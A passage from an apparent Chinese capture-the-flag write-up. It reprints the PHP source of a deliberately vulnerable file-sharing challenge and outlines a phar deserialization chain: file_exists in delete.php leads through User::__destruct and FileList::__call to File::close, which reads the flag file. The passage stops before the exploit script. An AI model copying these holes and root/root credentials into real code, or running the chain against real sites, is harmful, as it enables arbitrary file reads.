src&#x3D;&quot;static&#x2F;js&#x2F;bootstrap.bundle.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;static&#x2F;js&#x2F;toast.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;static&#x2F;js&#x2F;panel.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;nav aria-label&#x3D;&quot;breadcrumb&quot;&gt;</span><br><span class="line">    &lt;ol class&#x3D;&quot;breadcrumb&quot;&gt;</span><br><span class="line">        &lt;li class&#x3D;&quot;breadcrumb-item active&quot;&gt;管理面板&lt;&#x2F;li&gt;</span><br><span class="line">        &lt;li class&#x3D;&quot;breadcrumb-item active&quot;&gt;&lt;label for&#x3D;&quot;fileInput&quot; class&#x3D;&quot;fileLabel&quot;&gt;上传文件&lt;&#x2F;label&gt;&lt;&#x2F;li&gt;</span><br><span class="line">        &lt;li class&#x3D;&quot;active ml-auto&quot;&gt;&lt;a href&#x3D;&quot;#&quot;&gt;你好 &lt;?php echo $_SESSION[&#39;username&#39;]?&gt;&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;&#x2F;ol&gt;</span><br><span class="line">&lt;&#x2F;nav&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;file&quot; id&#x3D;&quot;fileInput&quot; class&#x3D;&quot;hidden&quot;&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;top&quot; id&#x3D;&quot;toast-container&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include &quot;class.php&quot;;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new FileList($_SESSION[&#39;sandbox&#39;]);</span><br><span class="line">$a-&gt;Name();</span><br><span class="line">$a-&gt;Size();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;download.php</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#39;login&#39;])) &#123;</span><br><span class="line">    header(&quot;Location: login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&#39;filename&#39;])) &#123;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">include &quot;class.php&quot;;</span><br><span class="line">ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:&#x2F;etc:&#x2F;tmp&quot;);</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[&#39;sandbox&#39;]);</span><br><span class="line">$file &#x3D; new File();</span><br><span class="line">$filename &#x3D; (string) $_POST[&#39;filename&#39;];</span><br><span class="line">if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) &#x3D;&#x3D;&#x3D; false) &#123;   &#x2F;&#x2F;stristr 搜索字符串在另一字符串中的第一次出现不区分大小写</span><br><span class="line">    Header(&quot;Content-type: application&#x2F;octet-stream&quot;);</span><br><span class="line">    Header(&quot;Content-Disposition: attachment; filename&#x3D;&quot; . basename($filename));</span><br><span class="line">    echo $file-&gt;close();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;File not exist&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;delete.php</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#39;login&#39;])) &#123;</span><br><span class="line">    header(&quot;Location: login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&#39;filename&#39;])) &#123;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">include &quot;class.php&quot;;</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[&#39;sandbox&#39;]);</span><br><span class="line">$file &#x3D; new File();</span><br><span class="line">$filename &#x3D; (string) $_POST[&#39;filename&#39;];</span><br><span class="line">if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(&quot;Content-type: application&#x2F;json&quot;);</span><br><span class="line">    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; true, &quot;error&quot; &#x3D;&gt; &quot;&quot;);</span><br><span class="line">    echo json_encode($response);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    Header(&quot;Content-type: application&#x2F;json&quot;);</span><br><span class="line">    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; false, &quot;error&quot; &#x3D;&gt; &quot;File not exist&quot;);</span><br><span class="line">    echo json_encode($response);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;register.php</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (isset($_SESSION[&#39;login&#39;])) &#123;</span><br><span class="line">    header(&quot;Location: index.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">  &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1, shrink-to-fit&#x3D;no&quot;&gt;</span><br><span class="line">  &lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&quot;&gt;</span><br><span class="line">  &lt;title&gt;注册&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- Bootstrap core CSS --&gt;</span><br><span class="line">  &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    .bd-placeholder-img &#123;</span><br><span class="line">      font-size: 1.125rem;</span><br><span class="line">      text-anchor: middle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @media (min-width: 768px) &#123;</span><br><span class="line">      .bd-placeholder-img-lg &#123;</span><br><span class="line">        font-size: 3.5rem;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;&#x2F;style&gt;</span><br><span class="line">  &lt;!-- Custom styles for this template --&gt;</span><br><span class="line">  &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;std.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body class&#x3D;&quot;text-center&quot;&gt;</span><br><span class="line">  &lt;form class&#x3D;&quot;form-signin&quot; action&#x3D;&quot;register.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">    &lt;h1 class&#x3D;&quot;h3 mb-3 font-weight-normal&quot;&gt;注册&lt;&#x2F;h1&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;username&quot; class&#x3D;&quot;sr-only&quot;&gt;Username&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;Username&quot; required autofocus&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;password&quot; class&#x3D;&quot;sr-only&quot;&gt;Password&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;Password&quot; required&gt;</span><br><span class="line">    &lt;button class&#x3D;&quot;btn btn-lg btn-primary btn-block&quot; type&#x3D;&quot;submit&quot;&gt;提交&lt;&#x2F;button&gt;</span><br><span class="line">    &lt;p class&#x3D;&quot;mt-5 mb-3 text-muted&quot;&gt;&amp;copy; 2018-2019&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;top&quot; id&#x3D;&quot;toast-container&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;static&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;static&#x2F;js&#x2F;bootstrap.bundle.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;static&#x2F;js&#x2F;toast.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include &quot;class.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) &#123;</span><br><span class="line">    $u &#x3D; new User();</span><br><span class="line">    $username &#x3D; (string) $_POST[&quot;username&quot;];</span><br><span class="line">    $password &#x3D; (string) $_POST[&quot;password&quot;];</span><br><span class="line">    if (strlen($username) &lt; 20 &amp;&amp; strlen($username) &gt; 2 &amp;&amp; strlen($password) &gt; 1) &#123;</span><br><span class="line">        if ($u-&gt;add_user($username, $password)) &#123;</span><br><span class="line">            echo(&quot;&lt;script&gt;window.location.href&#x3D;&#39;login.php?register&#39;;&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;toast(&#39;此用户名已被使用&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;script&gt;toast(&#39;请输入有效用户名和密码&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;class.php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$dbaddr &#x3D; &quot;127.0.0.1&quot;;</span><br><span class="line">$dbuser &#x3D; &quot;root&quot;;</span><br><span class="line">$dbpass &#x3D; &quot;root&quot;;</span><br><span class="line">$dbname &#x3D; &quot;dropbox&quot;;</span><br><span class="line">$db &#x3D; new mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class="line"></span><br><span class="line">class User &#123;</span><br><span class="line">    public $db;</span><br><span class="line"></span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        global $db;</span><br><span class="line">        $this-&gt;db &#x3D; $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function user_exist($username) &#123;</span><br><span class="line">        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;username&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ? LIMIT 1;&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;s&quot;, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;store_result();</span><br><span class="line">        $count &#x3D; $stmt-&gt;num_rows;</span><br><span class="line">        if ($count &#x3D;&#x3D;&#x3D; 0) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function add_user($username, $password) &#123;</span><br><span class="line">        if ($this-&gt;user_exist($username)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);</span><br><span class="line">        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;INSERT INTO &#96;users&#96; (&#96;id&#96;, &#96;username&#96;, &#96;password&#96;) VALUES (NULL, ?, ?);&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function verify_user($username, $password) &#123;</span><br><span class="line">        if (!$this-&gt;user_exist($username)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);</span><br><span class="line">        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;password&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ?;&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;s&quot;, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($expect);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        if (isset($expect) &amp;&amp; $expect &#x3D;&#x3D;&#x3D; $password) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        $this-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class FileList &#123;</span><br><span class="line">    private $files;</span><br><span class="line">    private $results;</span><br><span class="line">    private $funcs;</span><br><span class="line"></span><br><span class="line">    public function __construct($path) &#123;</span><br><span class="line">        $this-&gt;files &#x3D; array();</span><br><span class="line">        $this-&gt;results &#x3D; array();</span><br><span class="line">        $this-&gt;funcs &#x3D; array();</span><br><span class="line">        $filenames &#x3D; scandir($path);</span><br><span class="line"></span><br><span class="line">        $key &#x3D; array_search(&quot;.&quot;, $filenames);</span><br><span class="line">        unset($filenames[$key]);   &#x2F;&#x2F;销毁变量</span><br><span class="line">        $key &#x3D; array_search(&quot;..&quot;, $filenames);</span><br><span class="line">        unset($filenames[$key]);</span><br><span class="line"></span><br><span class="line">        foreach ($filenames as $filename) &#123;</span><br><span class="line">            $file &#x3D; new File();</span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push($this-&gt;files, $file);</span><br><span class="line">            $this-&gt;results[$file-&gt;name()] &#x3D; array();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __call($func, $args) &#123;  &#x2F;&#x2F;调用本类不存在的方法，将方法添加到funcs数组中，并将file类中的</span><br><span class="line">        array_push($this-&gt;funcs, $func);   </span><br><span class="line">        foreach ($this-&gt;files as $file) &#123;</span><br><span class="line">            $this-&gt;results[$file-&gt;name()][$func] &#x3D; $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        $table &#x3D; &#39;&lt;div id&#x3D;&quot;container&quot; class&#x3D;&quot;container&quot;&gt;&lt;div class&#x3D;&quot;table-responsive&quot;&gt;&lt;table id&#x3D;&quot;table&quot; class&#x3D;&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;;</span><br><span class="line">        $table .&#x3D; &#39;&lt;thead&gt;&lt;tr&gt;&#39;;</span><br><span class="line">        foreach ($this-&gt;funcs as $func) &#123;</span><br><span class="line">            $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;&#x2F;th&gt;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;Opt&lt;&#x2F;th&gt;&#39;;</span><br><span class="line">        $table .&#x3D; &#39;&lt;&#x2F;thead&gt;&lt;tbody&gt;&#39;;</span><br><span class="line">        foreach ($this-&gt;results as $filename &#x3D;&gt; $result) &#123;</span><br><span class="line">            $table .&#x3D; &#39;&lt;tr&gt;&#39;;</span><br><span class="line">            foreach ($result as $func &#x3D;&gt; $value) &#123;</span><br><span class="line">                $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;&#x2F;td&gt;&#39;;    &#x2F;&#x2F;将$value转换为 HTML 实体</span><br><span class="line">            &#125;</span><br><span class="line">            $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot; filename&#x3D;&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;download&quot;&gt;下载&lt;&#x2F;a&gt; &#x2F; &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;delete&quot;&gt;删除&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&#39;;</span><br><span class="line">            $table .&#x3D; &#39;&lt;&#x2F;tr&gt;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class File &#123;</span><br><span class="line">    public $filename;</span><br><span class="line"></span><br><span class="line">    public function open($filename) &#123;</span><br><span class="line">        $this-&gt;filename &#x3D; $filename;</span><br><span class="line">        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function name() &#123;</span><br><span class="line">        return basename($this-&gt;filename);  &#x2F;&#x2F;返回路径中的文件名部分</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function size() &#123;</span><br><span class="line">        $size &#x3D; filesize($this-&gt;filename);</span><br><span class="line">        $units &#x3D; array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;);</span><br><span class="line">        for ($i &#x3D; 0; $size &gt;&#x3D; 1024 &amp;&amp; $i &lt; 4; $i++) $size &#x2F;&#x3D; 1024;</span><br><span class="line">        return round($size, 2).$units[$i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function detele() &#123;</span><br><span class="line">        unlink($this-&gt;filename);  &#x2F;&#x2F;删除文件</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function close() &#123;</span><br><span class="line">        return file_get_contents($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;login.php</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (isset($_SESSION[&#39;login&#39;])) &#123;</span><br><span class="line">    header(&quot;Location: index.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">  &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1, shrink-to-fit&#x3D;no&quot;&gt;</span><br><span class="line">  &lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&quot;&gt;</span><br><span class="line">  &lt;title&gt;登录&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- Bootstrap core CSS --&gt;</span><br><span class="line">  &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    .bd-placeholder-img &#123;</span><br><span class="line">      font-size: 1.125rem;</span><br><span class="line">      text-anchor: middle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @media (min-width: 768px) &#123;</span><br><span class="line">      .bd-placeholder-img-lg &#123;</span><br><span class="line">        font-size: 3.5rem;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;&#x2F;style&gt;</span><br><span class="line">  &lt;!-- Custom styles for this template --&gt;</span><br><span class="line">  &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;std.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body class&#x3D;&quot;text-center&quot;&gt;</span><br><span class="line">  &lt;form class&#x3D;&quot;form-signin&quot; action&#x3D;&quot;login.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">    &lt;h1 class&#x3D;&quot;h3 mb-3 font-weight-normal&quot;&gt;登录&lt;&#x2F;h1&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;username&quot; class&#x3D;&quot;sr-only&quot;&gt;Username&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;Username&quot; required autofocus&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;password&quot; class&#x3D;&quot;sr-only&quot;&gt;Password&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;Password&quot; required&gt;</span><br><span class="line">    &lt;button class&#x3D;&quot;btn btn-lg btn-primary btn-block&quot; type&#x3D;&quot;submit&quot;&gt;提交&lt;&#x2F;button&gt;</span><br><span class="line">    &lt;p class&#x3D;&quot;mt-5 text-muted&quot;&gt;还没有账号? &lt;a href&#x3D;&quot;register.php&quot;&gt;注册&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;p class&#x3D;&quot;text-muted&quot;&gt;&amp;copy; 2018-2019&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;&#x2F;form&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;top&quot; id&#x3D;&quot;toast-container&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;static&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;static&#x2F;js&#x2F;bootstrap.bundle.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;static&#x2F;js&#x2F;toast.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include &quot;class.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;register&#39;])) &#123;</span><br><span class="line">    echo &quot;&lt;script&gt;toast(&#39;注册成功&#39;, &#39;info&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) &#123;</span><br><span class="line">    $u &#x3D; new User();</span><br><span class="line">    $username &#x3D; (string) $_POST[&quot;username&quot;];</span><br><span class="line">    $password &#x3D; (string) $_POST[&quot;password&quot;];</span><br><span class="line">    if (strlen($username) &lt; 20 &amp;&amp; $u-&gt;verify_user($username, $password)) &#123;</span><br><span class="line">        $_SESSION[&#39;login&#39;] &#x3D; true;</span><br><span class="line">        $_SESSION[&#39;username&#39;] &#x3D; htmlentities($username);</span><br><span class="line">        $sandbox &#x3D; &quot;uploads&#x2F;&quot; . sha1($_SESSION[&#39;username&#39;] . &quot;sftUahRiTz&quot;) . &quot;&#x2F;&quot;;</span><br><span class="line">        if (!is_dir($sandbox)) &#123;</span><br><span class="line">            mkdir($sandbox);</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[&#39;sandbox&#39;] &#x3D; $sandbox;</span><br><span class="line">        echo(&quot;&lt;script&gt;window.location.href&#x3D;&#39;index.php&#39;;&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;script&gt;toast(&#39;账号或密码错误&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>在class.php中，File::close()可以读取到文件内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>User类中的析构函数中有执行close()函数过程</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而FileList类中没有close()函数，但是如果调用FileList类中的close（）,就会调用到File类中的close()。从而获取flag的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        $filenames = scandir($path);</span><br><span class="line"></span><br><span class="line">        $key = array_search(<span class="string">"."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);   <span class="comment">//销毁变量</span></span><br><span class="line">        $key = array_search(<span class="string">".."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($filenames <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">            $file = <span class="keyword">new</span> File();</span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, $file);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;  <span class="comment">//调用本类不存在的方法，将方法添加到funcs数组中，并将file类中的</span></span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);   </span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="[https://www.cnblogs.com/20175211lyz/p/11403397.html#%E5%85%ADphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96](https://www.cnblogs.com/20175211lyz/p/11403397.html#六phar反序列化)">关于php反序列化</a>在刷题记录11当中也有两篇关于phar的文章<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">参考文章1</a>     <a href="https://xz.aliyun.com/t/2958" target="_blank" rel="noopener">参考文章2</a></p>
<p>重点在class.php，delete.php，和download.php中</p>
<p>在delete.php、download.php中file_exists会触发phar反序列化漏洞，但是在download.php有设置open_basedir，而delete.php中没有，所以选择delete.php</p>
<p>编写生成phar的脚本</p>
